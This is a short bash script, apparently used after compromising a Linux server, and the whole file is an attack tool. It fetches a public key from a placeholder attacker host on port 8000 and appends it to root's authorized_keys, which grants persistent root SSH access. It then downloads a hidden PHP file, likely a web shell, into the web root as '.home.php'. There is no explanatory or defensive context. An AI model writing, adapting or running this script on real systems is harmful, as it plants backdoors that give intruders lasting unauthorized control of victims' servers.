#!/bin/bash

mkdir /root/.ssh/
chmod 600 /root/.ssh/
curl IP:8000/key.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
curl IP:8000/home.php -o /var/www/html/.home.php
